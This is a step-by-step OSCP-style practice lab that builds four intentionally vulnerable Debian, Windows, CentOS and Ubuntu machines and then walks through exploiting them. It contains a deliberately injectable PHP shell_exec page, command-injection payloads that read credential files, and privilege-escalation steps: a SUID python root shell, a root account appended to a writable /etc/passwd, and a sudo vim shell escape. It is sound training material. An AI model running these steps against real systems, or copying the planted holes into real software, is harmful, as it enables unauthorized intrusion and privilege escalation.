# Lab: OSCP Exam Simulation 3 — With Step-by-Step Cheat Sheet

## Scoring

```
Debian  (standalone 1): 10 local + 10 proof = 20 pts
Windows (standalone 2): 10 local + 10 proof = 20 pts
AD Set  (CentOS→Ubuntu): 40 pts (all or nothing)
                                  Total: 80 pts | Pass: 56 pts (70%)
```

This simulation uses different attack vectors than Simulations 1 and 2 to broaden your practice.

---

## Setup

### Standalone 1: Debian (192.168.244.132)

```bash
sudo apt update && sudo apt install apache2 php libapache2-mod-php openssh-server -y
sudo systemctl enable --now apache2 ssh

echo "LOCAL{$(openssl rand -hex 16)}" | sudo tee /home/local.txt && sudo chmod 644 /home/local.txt
echo "PROOF{$(openssl rand -hex 16)}" | sudo tee /root/proof.txt && sudo chmod 600 /root/proof.txt

# Web app with command injection (different from sim 2)
sudo mkdir -p /var/www/html/tools
cat << 'PHPEOF' | sudo tee /var/www/html/tools/lookup.php
<?php $output="";
if(isset($_POST['domain'])){
    $d=$_POST['domain'];
    $output=shell_exec("nslookup ".$d." 2>&1");
}
?>
<html><body><h1>DNS Lookup Tool</h1>
<form method="POST">Domain: <input name="domain" size="30"> <button>Lookup</button></form>
<?php if($output): ?><pre><?php echo htmlspecialchars($output); ?></pre><?php endif; ?>
</body></html>
PHPEOF

echo "<html><body><h1>IT Tools Portal</h1>" | sudo tee /var/www/html/index.html
echo "<p><a href='/tools/lookup.php'>DNS Lookup</a></p>" | sudo tee -a /var/www/html/index.html
echo "</body></html>" | sudo tee -a /var/www/html/index.html

# Create a user for post-exploitation
sudo useradd -m -s /bin/bash techuser && echo "techuser:TechPass1!" | sudo chpasswd
echo "SSH creds: techuser / TechPass1!" | sudo tee /home/techuser/.credentials.txt
sudo chown techuser:techuser /home/techuser/.credentials.txt

# Privesc: SUID python3
sudo cp /usr/bin/python3 /usr/local/bin/python3_admin
sudo chmod u+s /usr/local/bin/python3_admin

sudo iptables -F && sudo iptables -P INPUT ACCEPT
```

### Standalone 2: Windows 11

```powershell
# Run as Administrator
-join((48..57)+(65..90)+(97..122)|Get-Random -Count 32|%{[char]$_}) | Out-File C:\Users\Public\local.txt
-join((48..57)+(65..90)+(97..122)|Get-Random -Count 32|%{[char]$_}) | Out-File C:\Users\Administrator\Desktop\proof.txt

net user intern Intern2026! /add

# FTP with anonymous access
Install-WindowsFeature Web-Ftp-Server -IncludeManagementTools 2>$null
# If IIS FTP isn't available, use a Python FTP server:
mkdir C:\FTPRoot
"Welcome to the FTP server." | Out-File C:\FTPRoot\welcome.txt
"Maintenance credentials: intern / Intern2026!" | Out-File C:\FTPRoot\readme.txt
"RDP is enabled for intern account." | Out-File C:\FTPRoot\notes.txt

# Simple FTP server
pip install pyftpdlib 2>$null
@"
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from pyftpdlib.authorizers import DummyAuthorizer
a = DummyAuthorizer()
a.add_anonymous('C:\\FTPRoot', perm='elr')
h = FTPHandler
h.authorizer = a
s = FTPServer(('0.0.0.0', 21), h)
s.serve_forever()
"@ | Out-File C:\FTPRoot\ftpserver.py
Start-Process python -ArgumentList "C:\FTPRoot\ftpserver.py" -WindowStyle Hidden

# Privesc: weak service permissions
mkdir C:\Services
copy C:\Windows\System32\cmd.exe C:\Services\monitor.exe
sc.exe create MonitorSvc binPath= "C:\Services\monitor.exe" start= auto obj= LocalSystem
icacls C:\Services\monitor.exe /grant Everyone:F

# Privesc vector 2: autologon credentials in registry
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "Administrator" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "WinAdm1n!" /f

Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

### AD Set: CentOS (192.168.244.131 / 172.16.0.1)

```bash
sudo systemctl stop firewalld && sudo systemctl disable firewalld
sudo systemctl enable --now sshd

sudo ip addr add 172.16.0.1/24 dev ens224 2>/dev/null && sudo ip link set ens224 up

echo "PROOF_AD1{$(openssl rand -hex 16)}" | sudo tee /root/proof.txt && sudo chmod 600 /root/proof.txt

# User with weak password (same as username)
sudo useradd -m -s /bin/bash operator && echo "operator:operator" | sudo chpasswd

# Breadcrumb in home directory
echo "=== Server Notes ===" | sudo tee /home/operator/notes.txt
echo "Ubuntu deployment server: 172.16.0.2" | sudo tee -a /home/operator/notes.txt
echo "Login: appuser / @ppUs3r2026" | sudo tee -a /home/operator/notes.txt
sudo chown operator:operator /home/operator/notes.txt

# Privesc: writable /etc/passwd
sudo chmod 666 /etc/passwd

# Networking for pivot
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/' /etc/ssh/sshd_config
sudo systemctl restart sshd

sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p icmp -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -P INPUT DROP && sudo iptables -P OUTPUT ACCEPT
sudo iptables -A FORWARD -s 192.168.244.0/24 -d 172.16.0.0/24 -j ACCEPT
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.244.0/24 -j ACCEPT
sudo iptables -P FORWARD DROP
sudo iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -o ens224 -j MASQUERADE
```

### AD Set: Ubuntu (172.16.0.2)

```bash
sudo ip addr add 172.16.0.2/24 dev ens38 2>/dev/null && sudo ip link set ens38 up
sudo apt update && sudo apt install openssh-server -y && sudo systemctl enable --now ssh

echo "PROOF_AD2{$(openssl rand -hex 16)}" | sudo tee /root/proof.txt && sudo chmod 600 /root/proof.txt

sudo useradd -m -s /bin/bash appuser && echo "appuser:@ppUs3r2026" | sudo chpasswd

# Privesc: sudo vim
echo "appuser ALL=(root) NOPASSWD: /usr/bin/vim" | sudo tee /etc/sudoers.d/appuser

sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -s 172.16.0.0/24 -j ACCEPT
sudo iptables -P INPUT DROP && sudo iptables -P OUTPUT ACCEPT
```

---

## CHEAT SHEET — Every step explained

### Phase 1: Initial scans (0:00 — 0:15)

```bash
nmap -sV -sC -oA debian 192.168.244.132 &
nmap -sV -sC -oA centos 192.168.244.131 &
nmap -sn 192.168.244.0/24    # find Windows IP
nmap -sV -sC -p- --min-rate=1000 -oA windows WINDOWS_IP &
```

**WHY ALL AT ONCE:** Scans run in background (`&`). While they work, you start reviewing results. This parallelization saves 10-15 minutes.

### Phase 2: Debian — Standalone 1 (0:15 — 1:30)

**Step 1: Review nmap → ports 22 (SSH), 80 (HTTP)**

```bash
cat debian.nmap
```

**Step 2: Browse the web server**

```bash
curl -s http://192.168.244.132/
# Links to /tools/lookup.php — a DNS lookup tool
```

**Step 3: Test the DNS lookup tool for command injection**

```bash
# Normal request via POST
curl -X POST http://192.168.244.132/tools/lookup.php -d "domain=google.com"
# Shows nslookup output — normal

# Test injection with semicolon
curl -X POST http://192.168.244.132/tools/lookup.php -d "domain=google.com;id"
# Shows nslookup output PLUS: uid=33(www-data) — command injection confirmed!
```

**WHY SEMICOLONS WORK:** The server runs `nslookup YOUR_INPUT`. A semicolon (`;`) in bash means "end this command, start a new one." So `nslookup google.com; id` runs nslookup, then runs `id` as a separate command. The server doesn't sanitize your input, so the semicolon gets through.

**Step 4: Enumerate through command injection**

```bash
curl -X POST http://192.168.244.132/tools/lookup.php -d "domain=x;cat+/etc/passwd"
# Find users with bash shells — notice "techuser"

curl -X POST http://192.168.244.132/tools/lookup.php -d "domain=x;ls+-la+/home/techuser"
# See .credentials.txt

curl -X POST http://192.168.244.132/tools/lookup.php -d "domain=x;cat+/home/techuser/.credentials.txt"
# SSH creds: techuser / TechPass1!
```

**WHY `+` INSTEAD OF SPACES:** In URL/POST encoding, `+` represents a space. `cat+/etc/passwd` becomes `cat /etc/passwd` on the server. If you use literal spaces in POST data, they might not be sent correctly.

**Step 5: SSH as techuser → local.txt**

```bash
ssh techuser@192.168.244.132    # Password: TechPass1!
cat /home/local.txt && whoami && ip a    # SCREENSHOT THIS
```

**Step 6: Privilege escalation — SUID python3**

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/python3_admin has SUID bit set

/usr/local/bin/python3_admin -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami    # root
cat /root/proof.txt && whoami && ip a    # SCREENSHOT THIS
```

**WHY THIS WORKS:** The python3_admin binary has the SUID bit set, meaning it runs as its owner (root) regardless of who executes it. `os.setuid(0)` sets the process's user ID to 0 (root). `os.system("/bin/bash")` spawns a root shell. Normal Python doesn't allow `setuid` without SUID privilege — but this binary HAS SUID, so it succeeds.

**Score: 20/80**

### Phase 3: Windows — Standalone 2 (1:30 — 3:30)

**Step 1: Review nmap results**

```bash
cat windows.nmap
# Shows: 21/tcp FTP, 3389/tcp RDP, 445/tcp SMB (and possibly more)
```

**WHY FTP IS INTERESTING:** FTP on an OSCP machine almost always has anonymous access or leaked credentials. Always check it.

**Step 2: Check FTP for anonymous access**

```bash
ftp WINDOWS_IP
# Username: anonymous
# Password: (blank or anything)
ls
get readme.txt
get notes.txt
exit

cat readme.txt
# Maintenance credentials: intern / Intern2026!
cat notes.txt
# RDP is enabled for intern account
```

**WHY ANONYMOUS FTP MATTERS:** Anonymous FTP lets anyone connect without credentials. Files on anonymous FTP shares are intentionally or accidentally exposed. Credentials, documentation, and backups are commonly found here.

**Step 3: RDP with found credentials → local.txt**

```bash
xfreerdp /v:WINDOWS_IP /u:intern /p:'Intern2026!' /cert-ignore
```

In the RDP session:
```cmd
type C:\Users\Public\local.txt & whoami & ipconfig    :: SCREENSHOT THIS
```

**Step 4: Privilege escalation**

```cmd
:: Check autologon credentials in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "Default"
:: DefaultUserName = Administrator
:: DefaultPassword = WinAdm1n!
```

**WHY CHECK THE REGISTRY:** When Windows is configured for autologon, the password is stored in plaintext in the registry. Any user who can query the registry (which is most users) can read it.

```cmd
:: Use the admin password
runas /user:Administrator cmd.exe
:: Enter: WinAdm1n!

:: In the new admin window:
type C:\Users\Administrator\Desktop\proof.txt & whoami & ipconfig    :: SCREENSHOT THIS
```

**Score: 40/80**

### Phase 4: AD Set — CentOS (3:30 — 5:00)

**Step 1: nmap showed only SSH (22) on CentOS**

No web server this time. The attack path is through SSH.

**Step 2: Try common weak passwords on SSH**

```bash
# The username "operator" is common for operations accounts
# Try username=password
ssh operator@192.168.244.131    # Password: operator
# IT WORKS — the password is the same as the username
```

**WHY THIS WORKS:** `operator:operator` is a classic weak credential. On the OSCP, always try: `admin:admin`, `root:root`, `user:user`, `test:test`, and the service name as both username and password. Hydra with `-e nsr` tests these automatically (`n`=null, `s`=same as username, `r`=reversed).

**Step 3: Enumerate CentOS**

```bash
cat /home/operator/notes.txt
# Ubuntu deployment server: 172.16.0.2
# Login: appuser / @ppUs3r2026
```

**Step 4: Privilege escalation — writable /etc/passwd**

```bash
ls -la /etc/passwd
# -rw-rw-rw- — world writable!

# Generate a password hash
openssl passwd -1 hacked
# Output: $1$xxxxxxxx$yyyyyyyyyyyyyyyyyyyy

# Add a root-level user
echo 'hacked:$1$xxxxxxxx$yyyyyyyyyyyyyyyyyyyy:0:0::/root:/bin/bash' >> /etc/passwd
```

**WHY THIS WORKS:** `/etc/passwd` defines user accounts. The third field (after the second `:`) is the UID. UID 0 = root. By adding a user with UID 0, you create another root account. Normally `/etc/passwd` is only writable by root (644), but this machine has it set to 666 (world writable) — a critical misconfiguration.

```bash
su hacked    # Password: hacked
whoami       # root
cat /root/proof.txt && whoami && ip a    # SCREENSHOT THIS
```

### Phase 5: AD Set — Pivot to Ubuntu (5:00 — 6:30)

**Step 5: SSH to Ubuntu through CentOS**

```bash
# From CentOS (you have root from the previous step)
ssh appuser@172.16.0.2    # Password: @ppUs3r2026
```

**WHY FROM CENTOS:** Ubuntu only accepts connections from 172.16.0.0/24 (the internal network). CentOS's ens224 interface (172.16.0.1) is on that network. Your Kali machine (192.168.244.x) is NOT on that network and would be blocked by Ubuntu's iptables rules.

**Step 6: Escalate on Ubuntu**

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vim

sudo vim -c ':!bash'
```

**WHY THIS WORKS:** `sudo -l` shows the appuser can run `/usr/bin/vim` as root without a password. Vim has a built-in feature to execute shell commands: `:!command` runs a command from within vim. `:!bash` spawns a bash shell. Since vim is running as root (via sudo), the bash shell is also root.

The `-c` flag runs a vim command immediately on startup, so you don't even need to interact with vim's interface.

```bash
whoami    # root
cat /root/proof.txt && whoami && ip a    # SCREENSHOT THIS
```

**Score: 80/80 — PASS**

---

## Summary of Attack Paths

```
SIMULATION 3 — ATTACK VECTORS:

Debian:   Command injection (nslookup) → cred in dotfile → SSH → SUID python3
Windows:  Anonymous FTP → creds → RDP → autologon password in registry
CentOS:   Weak SSH password (operator:operator) → writable /etc/passwd
Ubuntu:   SSH from CentOS with found creds → sudo vim

COMPARED TO SIMULATION 1:
  Sim 1: FTP hint → SQLi → file upload → sudo less
  Sim 2: HTML comment → SQLi → SSH → sudo find
  Sim 3: Command injection → credential file → SUID python3

COMPARED TO SIMULATION 2:
  Sim 2 Windows: HTML comment → RDP → stored credentials
  Sim 3 Windows: Anonymous FTP → RDP → autologon registry

Each simulation practices DIFFERENT vectors so you build breadth.
```

---

## Cleanup

```bash
# Debian
sudo userdel -r techuser && sudo rm /usr/local/bin/python3_admin
sudo rm -rf /var/www/html/tools /home/local.txt /root/proof.txt

# Windows: reverse all setup steps

# CentOS
sudo userdel -r operator && sudo sed -i '/^hacked:/d' /etc/passwd && sudo chmod 644 /etc/passwd
sudo rm /root/proof.txt
sudo iptables -F && sudo iptables -t nat -F && sudo iptables -P INPUT ACCEPT && sudo iptables -P FORWARD ACCEPT

# Ubuntu
sudo userdel -r appuser && sudo rm /etc/sudoers.d/appuser /root/proof.txt
sudo iptables -F && sudo iptables -P INPUT ACCEPT
```
